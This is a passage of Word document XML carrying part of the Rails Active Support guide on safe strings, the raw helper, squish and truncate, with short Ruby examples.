              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"".html_safe + "&lt;".html_safe # =&gt; "&lt;"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="011A6267" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>These methods should not be used in ordinary views. In Rails 3 unsafe values are automatically escaped:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7295"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="150EEB31" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6C3DAC7B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="2087998448"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@review.title %&gt;</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%# fine in Rails 3, escaped if needed %&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7861633B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">To insert something verbatim use the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>raw</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> helper rather than calling </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>html_safe</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5E587E5" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4B28C39F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="8605209"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>raw @cms.current_template %&gt;</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%# inserts @cms.current_template as is %&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="019B53EE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">or, equivalently, use </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>&lt;%==</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0752AB47" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3EEF8F21" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="2042048474"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%== @cms.current_template %&gt;</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%# inserts @cms.current_template as is %&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="098169E9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>raw</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> helper calls </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>html_safe</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> for you:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3360"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="1710D026" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="44C8BC14" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>raw(stringish)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="63E41A17" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  stringish.to_s.html_safe</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="40C9C17E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7B0DFF51" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/string/output_safety.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6308CB7F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>5.1.3 Transformation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6373B7C1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">As a rule of thumb, except perhaps for concatenation as explained above, any method that may change a string gives you an unsafe string. These are </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>downcase</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>gsub</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>strip</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>chomp</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>underscore</w:t>
      </w:r>
      <w:r>
        <w:t>, etc.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="695D412D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In the case of in-place transformations like </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>gsub!</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> the receiver itself becomes unsafe.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="399A41ED" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>The safety bit is lost always, no matter whether the transformation actually changed something.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DDFEE1F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>5.1.4 Conversion and Coercion</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42BF10F9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Calling </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_s</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> on a safe string returns a safe string, but coercion with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_str</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> returns an unsafe string.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36FB0815" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>5.1.5 Copying</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5771EF7C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Calling </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>dup</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>clone</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> on safe strings yields safe strings.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48FD4A6D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">5.2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>squish</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="381D2465" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>squish</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> strips leading and trailing whitespace, and substitutes runs of whitespace with a single space each:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5640"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="08AD9427" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="510A06A4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="839269161"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>" \n  foo\n\r \t bar \n".squish # =&gt; "foo bar"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="06195617" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">There’s also the destructive version </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>String#squish!</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1508737F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/string/filters.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00437907" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">5.3 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>truncate</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3786A343" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>truncate</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> returns a copy of its receiver truncated after a given </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>length</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5880"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="0CDB53D1" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="43321124" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"Oh dear! Oh dear! I shall be late!".truncate(20)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="72C86519" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; "Oh dear! Oh dear!..."</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="552B2369" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Ellipsis can be customized with the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:omission</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option:</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BD4F95B" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="72FA4C9B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"Oh dear! Oh dear! I shall be late!".truncate(20, :omission</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; '&amp;hellip;')</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0759D1DE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; "Oh dear! Oh &amp;hellip;"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="546EEB61" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Note in particular that truncation takes into account the length of the omission string.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E48C17A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Pass a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:separator</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to truncate the string at a natural break:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8088"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="2FA43A45" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="08334BFA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"Oh dear! Oh dear! I shall be late!".truncate(18)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="32F66374" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; "Oh dear! Oh dea..."</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3152245F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"Oh dear! Oh dear! I shall be late!".truncate(18, :separator</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; ' ')</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="374A1213" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; "Oh dear! Oh..."</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4A5C3AF6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In the above example “dear” gets cut first, but then </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:separator</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> prevents it.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F4EDDA9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The option </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:separator</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> can’t be a regexp.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F9A849F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/string/filters.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05DE94A4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">5.4 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>inquiry</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46F918FE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>inquiry</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method converts a string into a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>StringInquirer</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> object making equality checks prettier.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5880"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="73A9A896" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
